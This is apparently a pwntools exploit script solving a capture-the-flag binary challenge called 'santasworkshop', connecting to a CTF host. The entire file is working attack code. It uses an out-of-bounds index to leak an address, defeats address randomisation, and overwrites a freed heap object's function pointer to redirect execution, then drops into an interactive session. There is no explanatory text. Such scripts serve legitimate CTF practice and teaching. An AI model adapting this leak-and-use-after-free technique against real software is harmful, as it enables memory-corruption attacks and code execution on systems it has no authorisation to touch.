from pwn import *

gs = '''
b *menu+117
continue
'''

elf = context.binary = ELF("./santasworkshop.elf")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['kitty', '--']
io = start()

io.sendlineafter("> ", b"1")

io.sendlineafter("Tell me an index and I will show you the entry", b"-252")

io.recvline()
leak_address =  u64(io.recvline().strip().ljust(8, b"\x00")) - 91 # menu + 91 - 91

print(hex(leak_address))
elf.address = leak_address - elf.sym.menu

print(hex(elf.sym.present))

size_malloc = 0x30

io.sendlineafter("> ", b"3")

new_workshop = b"".join([
    b"A"*0x28,
    p64(elf.sym.present)
])

io.sendlineafter("> ", b"4")
io.sendlineafter("How long is your deed?", str(size_malloc).encode())
io.sendlineafter("Okay, tell me the deed", new_workshop)
io.sendlineafter("> ", b"2")

io.interactive()
